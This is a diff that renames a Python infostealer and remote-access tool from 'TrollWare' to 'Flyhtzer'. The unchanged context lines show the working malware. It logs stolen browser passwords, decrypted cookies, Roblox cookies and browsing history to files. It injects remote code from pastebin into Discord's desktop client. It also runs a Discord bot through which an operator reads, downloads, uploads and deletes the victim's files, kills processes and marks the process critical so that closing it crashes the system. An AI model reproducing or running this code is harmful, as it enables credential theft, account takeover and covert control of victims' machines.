@@ -218,7 +218,7 @@ class Logging:
                 date_created = row[4]
                 date_last_used = row[5]        
                 if username or password:
-                    f.write("─────────────────────────[TROLL]─────────────────────────\n \nUSER:: %s \nPASS:: %s \nFROM:: %s \n \n" % (username, password, origin_url))
+                    f.write("─────────────────────────[Flyhtzer]─────────────────────────\n \nUSER:: %s \nPASS:: %s \nFROM:: %s \n \n" % (username, password, origin_url))
                 else:
                     continue
             f.close()
@@ -244,10 +244,10 @@ class Logging:
                         try:
                             directory_list = os.path.join(root, name+"\\discord_desktop_core\\index.js")
                             try:
-                                os.rmdir(os.path.join(root, name+"\\discord_desktop_core\\Troll"))
+                                os.rmdir(os.path.join(root, name+"\\discord_desktop_core\\Flyhtzer"))
                             except:
                                 pass
-                            os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Troll"))
+                            os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Flyhtzer"))
                             f = urlopen(f'https://pastebin.com/raw/{payloadurl}')  # Use 'injecturl in Settings to change your injection code
                             index_content = f.read()
                             with open(directory_list, 'wb') as index_file:
@@ -350,9 +350,9 @@ Postal Code: {postal}"""
             cursor.execute(select_statement)
             history = cursor.fetchall()
             with open('C:\ProgramData\history.txt', "w+", encoding="utf-8") as f:
-                f.write('HISTORY LOGGED!' + '\n' + '─────────────────────[TROLL]─────────────────────' + '\n' + '\n')
+                f.write('HISTORY LOGGED!' + '\n' + '─────────────────────[Flyhtzer]─────────────────────' + '\n' + '\n')
                 for title, url in history:
-                    f.write(f"Title: {str(title.encode('unicode-escape').decode('utf-8')).strip()}\nURL: {str(url.encode('unicode-escape').decode('utf-8')).strip()}" + "\n" + "\n" + "─────────────────────[TROLL]─────────────────────"+ "\n" + "\n")
+                    f.write(f"Title: {str(title.encode('unicode-escape').decode('utf-8')).strip()}\nURL: {str(url.encode('unicode-escape').decode('utf-8')).strip()}" + "\n" + "\n" + "─────────────────────[Flyhtzer]─────────────────────"+ "\n" + "\n")
                 f.close()
             c.close()
             os.remove("C:\ProgramData\histdb.db")
@@ -417,7 +417,7 @@ Postal Code: {postal}"""
             try:
                 import browser_cookie3 # This module is really buggy I don't really suggest using it!
                 f = open('C://ProgramData//robloxcookies.txt', "w+", encoding="utf-8")
-                f.write('─────────────────────[TROLL]─────────────────────\n')
+                f.write('─────────────────────[Flyhtzer]─────────────────────\n')
                 robloxcookies_found = False
                 try:
                     cookies = browser_cookie3.edge(domain_name='roblox.com')
@@ -502,7 +502,7 @@ Postal Code: {postal}"""
                         encrypted_cookie = r[2]
                         decrypted_cookie = Logging.Passwords.DecryptPass(encrypted_cookie, master_key)
                         if Host != "":
-                            f.write(f"─────────────────────────[TROLL]─────────────────────────\n \nURL:: {Host}\nUSER:: {user}\nCOOKIE:: {decrypted_cookie} \n \n")
+                            f.write(f"─────────────────────────[Flyhtzer]─────────────────────────\n \nURL:: {Host}\nUSER:: {user}\nCOOKIE:: {decrypted_cookie} \n \n")
                 except:
                     cookiesfound = False
                 cursor.close()
@@ -884,7 +884,7 @@ Postal Code: {postal}"""
                         embed.add_field(name = "DETAILS:", value = f"```{e}```",  inline=False)
                         await ctx.send(embed = embed)
                 else:
-                    embed = discord.Embed(title = f"TrollWare Error", color=embedcolor)
+                    embed = discord.Embed(title = f"Flyhtzer Error", color=embedcolor)
                     embed.add_field(name = ">unblockinput", value = f"```You need ADMIN Privileges for this command!```",  inline=False)
                     await ctx.send(embed = embed)
 
@@ -893,7 +893,7 @@ Postal Code: {postal}"""
                 path = os.path.join(os.getenv('TEMP') + "\\temp.jpg")
                 await ctx.message.attachments[0].save(path)
                 ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
-                embed = discord.Embed(title = f"TrollWare", color=embedcolor)
+                embed = discord.Embed(title = f"Flyhtzer", color=embedcolor)
                 embed.add_field(name = ">setwallpaper", value = f"```Wallpaper Set Successfully!```",  inline=False)
                 await ctx.send(embed = embed)
 
@@ -901,7 +901,7 @@ Postal Code: {postal}"""
             async def messagebox(ctx, message):
                 os.system('powershell "(new-object -ComObject wscript.shell).Popup(\\"{}\\",0,\\"Windows\\")"'.format(message))
                 ctypes.windll.user32.SystemParametersInfoW(20, 0, path , 0)
-                embed = discord.Embed(title = f"TrollWare", color=embedcolor)
+                embed = discord.Embed(title = f"Flyhtzer", color=embedcolor)
                 embed.add_field(name = ">messagebox", value = f"```MessageBox Shown!```",  inline=False)
                 await ctx.send(embed = embed)
 
@@ -910,11 +910,11 @@ Postal Code: {postal}"""
                 try:
                     path = os.path.join(os.getenv('TEMP') + f"\\{filename}")
                     await ctx.message.attachments[0].save(path)
-                    embed = discord.Embed(title = f"TrollWare {path}", color=embedcolor)
+                    embed = discord.Embed(title = f"Flyhtzer {path}", color=embedcolor)
                     embed.add_field(name = ">upload", value = f"```Uploaded File Successfully!```",  inline=False)
                     await ctx.send(embed = embed)
                 except:
-                    embed = discord.Embed(title = f"TrollWare Error", color=embedcolor)
+                    embed = discord.Embed(title = f"Flyhtzer Error", color=embedcolor)
                     embed.add_field(name = ">upload", value = f"```Error! make sure the <filename> includes the extension (ex. lol.exe)```",  inline=False)
                     await ctx.send(embed = embed)                    
 
@@ -927,7 +927,7 @@ Postal Code: {postal}"""
 
             @client.command()
             async def scrapecomputer(ctx):
-                embed = discord.Embed(title = f"TrollWare", color=embedcolor)
+                embed = discord.Embed(title = f"Flyhtzer", color=embedcolor)
                 embed.add_field(name = ">scrapecomputer", value = f"```Gathering & Sending Data...```",  inline=False)
                 await ctx.send(embed = embed)
                 f = open("C:\ProgramData\scrapepc.txt", "w+", encoding="utf-8")
@@ -962,7 +962,7 @@ Postal Code: {postal}"""
                     f = open("C:\\ProgramData\\systeminfo.txt", "w")
                     f.write(driverinfo)
                     f.close()
-                    embed = discord.Embed(title = f"TrollWare", color=embedcolor)
+                    embed = discord.Embed(title = f"Flyhtzer", color=embedcolor)
                     embed.add_field(name = ">systeminfo", value = "```Gathering & Sending Data...```",  inline=False)
                     await ctx.send(embed = embed)
                     await ctx.send(file=discord.File(r'C:\\ProgramData\\systeminfo.txt'))
@@ -973,7 +973,7 @@ Postal Code: {postal}"""
                 import win32com.client as wincl
                 speak = wincl.Dispatch("SAPI.SpVoice")
                 speak.Speak(message)
-                embed = discord.Embed(title = f"TrollWare - ({message})", color=embedcolor)
+                embed = discord.Embed(title = f"Flyhtzer - ({message})", color=embedcolor)
                 embed.add_field(name = ">saymessage", value = f"```Voiced Successfully!```",  inline=False)
                 await ctx.send(embed = embed)
 
@@ -984,16 +984,16 @@ Postal Code: {postal}"""
                     try:	
                         ctypes.windll.ntdll.RtlAdjustPrivilege(20, 1, 0, ctypes.byref(ctypes.c_bool()))
                         ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0) == 0
-                        embed = discord.Embed(title = f"TrollWare", color=embedcolor)
+                        embed = discord.Embed(title = f"Flyhtzer", color=embedcolor)
                         embed.add_field(name = ">criticalproc", value = f"```This process has been made critical (Will bluescreen if closed)```",  inline=False)
                         await ctx.send(embed = embed)
                         
                     except Exception as e:
-                        embed = discord.Embed(title = "TrollWare Error", color=embedcolor)
+                        embed = discord.Embed(title = "Flyhtzer Error", color=embedcolor)
                         embed.add_field(name = "DETAILS:", value = f"```{e}```",  inline=False)
                         await ctx.send(embed = embed)
                 else:
-                    embed = discord.Embed(title = f"TrollWare Error", color=embedcolor)
+                    embed = discord.Embed(title = f"Flyhtzer Error", color=embedcolor)
                     embed.add_field(name = ">criticalproc", value = f"```You need ADMIN Privileges for this command!```",  inline=False)
                     await ctx.send(embed = embed)
 
@@ -1001,7 +1001,7 @@ Postal Code: {postal}"""
             async def read(ctx, file, output_type):
                 files = open(file, "r").read()
                 if output_type == "embed":
-                    embed = discord.Embed(title = f"TrollWare - ({file})", color=embedcolor)
+                    embed = discord.Embed(title = f"Flyhtzer - ({file})", color=embedcolor)
                     embed.add_field(name = ">read", value = f"```\n{files}\n```",  inline=False)
                     await ctx.send(embed = embed)
                 else:
@@ -1009,7 +1009,7 @@ Postal Code: {postal}"""
                     f = open("C:\\ProgramData\\readdata.txt", "w")
                     f.write(files)
                     f.close()
-                    embed = discord.Embed(title = f"TrollWare - ({file})", color=embedcolor)
+                    embed = discord.Embed(title = f"Flyhtzer - ({file})", color=embedcolor)
                     embed.add_field(name = ">read", value = f"```Read File Successfully, Sending Output```",  inline=False)
                     await ctx.send(embed = embed)
                     await ctx.send(file=discord.File(r'C:\\ProgramData\\readdata.txt'))
@@ -1017,7 +1017,7 @@ Postal Code: {postal}"""
         
             @client.command()
             async def download(ctx, filepath):
-                embed = discord.Embed(title = f"TrollWare - ({filepath})", color=embedcolor)
+                embed = discord.Embed(title = f"Flyhtzer - ({filepath})", color=embedcolor)
                 embed.add_field(name = ">download", value = f"```{filepath} Successfully Downloaded!```",  inline=False)
                 await ctx.send(embed = embed)
                 await ctx.send(file=discord.File(fr'{filepath}'))
@@ -1025,7 +1025,7 @@ Postal Code: {postal}"""
             @client.command()
             async def delete(ctx, file):
                 os.remove(file)
-                embed = discord.Embed(title = f"TrollWare - ({file})", color=embedcolor)
+                embed = discord.Embed(title = f"Flyhtzer - ({file})", color=embedcolor)
                 embed.add_field(name = ">delete", value = f"```Successfully Deleted: {file}```",  inline=False)
                 await ctx.send(embed = embed)
 
@@ -1033,11 +1033,11 @@ Postal Code: {postal}"""
             async def endtask(ctx, taskname):
                 try:
                     os.system('taskkill /im ' + taskname + ' /f')
-                    embed = discord.Embed(title = f"TrollWare - ({taskname})", color=embedcolor)
+                    embed = discord.Embed(title = f"Flyhtzer - ({taskname})", color=embedcolor)
                     embed.add_field(name = ">endtask", value = f"```Successfully Ended: {taskname}```",  inline=False)
                     await ctx.send(embed = embed)
                 except Exception as e:
-                    embed = discord.Embed(title = "TrollWare Error", color=embedcolor)
+                    embed = discord.Embed(title = "Flyhtzer Error", color=embedcolor)
                     embed.add_field(name = "DETAILS:", value = f"```{e}```",  inline=False)
                     await ctx.send(embed = embed)
 
@@ -1045,11 +1045,11 @@ Postal Code: {postal}"""
             async def admincheck(ctx):
                 admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                 if admin == True:
-                    embed = discord.Embed(title = "TrollWare", color=embedcolor)
+                    embed = discord.Embed(title = "Flyhtzer", color=embedcolor)
                     embed.add_field(name = ">admincheck", value = "```Program has Admin Privileges: TRUE```",  inline=False)
                     await ctx.send(embed = embed)
                 elif admin == False:
-                    embed = discord.Embed(title = "TrollWare", color=embedcolor)
+                    embed = discord.Embed(title = "Flyhtzer", color=embedcolor)
                     embed.add_field(name = ">admincheck", value = "```Program has Admin Privileges: FALSE```",  inline=False)
                     await ctx.send(embed = embed)	
 
